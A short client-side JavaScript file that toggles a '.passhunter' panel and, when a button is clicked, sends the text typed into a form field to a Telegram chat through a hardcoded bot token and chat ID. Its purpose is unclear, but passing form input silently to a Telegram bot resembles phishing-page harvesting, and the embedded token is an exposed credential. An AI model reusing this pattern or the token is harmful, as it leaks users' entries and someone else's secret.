const passBtn = document.getElementById('passh');
const wrapper = document.querySelector('.wrapper');
const pass= document.querySelector('.passhunter');
passBtn.addEventListener('click', () => {
    console.log('Pass button clicked');
    wrapper.style.display = 'none';
    pass.style.display = 'block';
});

const sendBTN = document.getElementById('send');
sendBTN.addEventListener('click', () => {
    const token = '7572678936:AAFVDE7hZGMq3AI4LFV71gIfPYtAPzvWIu0';
    const chatId = '-1002776151063';
    const messageInput = document.getElementById('name');
    const message = messageInput.value + " YES!";

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        chat_id: chatId,
        text: message
    })
    })
    .then(response => response.json())
    .then(data => console.log('Message sent:', data))
    .catch(error => console.error('Error:', error));
});